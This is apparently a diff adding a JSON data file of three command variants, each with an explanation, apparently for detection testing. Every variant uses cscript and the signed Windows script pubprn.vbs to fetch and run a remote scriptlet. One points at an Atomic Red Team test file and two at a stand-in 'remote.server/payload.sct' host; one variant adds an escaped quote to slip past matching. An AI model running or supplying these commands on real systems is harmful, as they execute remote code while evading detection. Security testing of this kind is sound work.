@@ -1,0 +1,14 @@
+[
+  {
+    "output": "cscript.exe //b C:\\Windows\\System32\\Printing_Admin_Scripts\\en-US\\pubprn.vbs localhost \"script:https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1216.001/src/T1216.001.sct\"",
+    "explanation": "This command uses the short form of the /b flag as //b, which is equivalent. It also uses double quotes around the URL to ensure correct parsing, which is a safe mutation technique."
+  },
+  {
+    "output": "cscript //nologo pubprn.vbs 127.0.0.1 \"scr\\\"ipt:https://remote.server/payload.sct\"",
+    "explanation": "This command uses an escaped quote (\\\") to simulate a bypass by modifying the string representation while maintaining the same execution behavior. It is a safe mutation technique for testing."
+  },
+  {
+    "output": "cscript pubprn.vbs 127.0.0.1 \"script:https://remote.server/payload.sct\"",
+    "explanation": "This command omits optional flags like //nologo and uses a direct URL without concatenation or obfuscation, which is still valid and demonstrates a minimal form of the original command."
+  }
+]
